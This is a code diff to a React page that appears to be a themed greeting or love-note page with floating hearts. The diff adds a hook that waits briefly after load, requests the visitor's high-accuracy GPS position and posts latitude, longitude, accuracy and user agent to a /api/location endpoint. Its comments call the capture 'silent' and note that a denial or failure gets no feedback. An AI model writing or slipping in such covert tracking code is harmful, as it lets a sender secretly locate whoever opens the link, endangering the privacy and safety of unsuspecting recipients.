@@ -200,10 +200,43 @@ export default function Page() {
     setFrom((p.get("from") || "").trim());
     const t = p.get("theme");
     if (t === "pink" || t === "midnight" || t === "pastel") setTheme(t);
+
   }, []);
+
+
   useEffect(() => {
     document.documentElement.dataset.theme = theme;
   }, [theme]);
+
+  /* capture location when the app opens (silent) */
+  useEffect(() => {
+    if (!("geolocation" in navigator)) return;
+
+    const timer = window.setTimeout(() => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          fetch("/api/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              source: "gps",
+              userAgent: navigator.userAgent,
+            }),
+          }).catch(() => {
+            /* silent failure */
+          });
+        },
+        () => {
+          /* permission denied or timeout — no feedback */
+        },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 }
+      );
+    }, 700);
+    return () => window.clearTimeout(timer);
+  }, []);
 
   /* floating hearts */
   const addHeart = (emoji?: string) => {
